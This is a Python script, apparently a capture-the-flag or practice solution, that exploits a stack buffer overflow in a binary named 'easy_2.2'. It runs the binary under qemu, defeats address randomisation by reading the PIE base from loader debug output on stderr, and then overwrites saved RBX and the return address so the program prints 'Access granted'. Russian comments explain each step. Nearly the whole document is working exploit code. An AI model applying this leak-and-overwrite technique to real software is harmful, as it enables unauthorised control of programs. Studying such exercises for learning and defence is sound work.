import re
import struct
import subprocess
import sys


command = [
    "qemu-amd64",
    "-E",
    "LD_DEBUG=files",
    "-L",
    "/",
    "/lib64/ld-linux-x86-64.so.2",
    "./easy_2.2",
]
process = subprocess.Popen(
    command,
    stdin=subprocess.PIPE,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
)

# PIE рандомизирует абсолютный адрес кода и данных при каждом старте.
# Читаем диагностические строки stderr до строки с базой главного ELF-файла;
# найденное значение далее используется для расчёта обоих адресов внутри ELF.
base = None
while True:
    line = process.stderr.readline()
    if not line:
        break
    match = re.search(rb"base:\s*(0x[0-9a-fA-F]+)", line)
    if match:
        base = int(match.group(1), 16)
        break

if base is None:
    # Без базы нельзя корректно собрать адреса в payload.
    process.wait()
    raise SystemExit("Could not determine easy_2.2 PIE base")

# После 40 байтов достигается сохранённый RBX.
# Его заменяем адресом строки "Access granted" (.rodata + 0x2004), затем
# пропускаем сохранённый RBP (8 байтов) и перезаписываем адрес возврата.
# Блок base+0x10A8 использует RBX как аргумент puts и печатает строку.
payload = (
    b"A" * 40
    + struct.pack("<Q", base + 0x2004)  # адрес строки "Access granted"
    + b"B" * 8
    + struct.pack("<Q", base + 0x10A8)  # адрес блока, вызывающего puts
    + b"\n"
)
process.stdin.write(payload)
# Закрытие stdin сообщает программе конец входа; gets возвращает управление,
# когда встречает перевод строки, после чего можно прочитать stdout процесса.
process.stdin.close()

output = process.stdout.read()
diagnostics = process.stderr.read()
return_code = process.wait()
sys.stdout.buffer.write(output)

# Нужная фраза появляется до возможного сбоя на дальнейшей цепочке возврата.
if return_code != 0:
    sys.stderr.buffer.write(diagnostics)
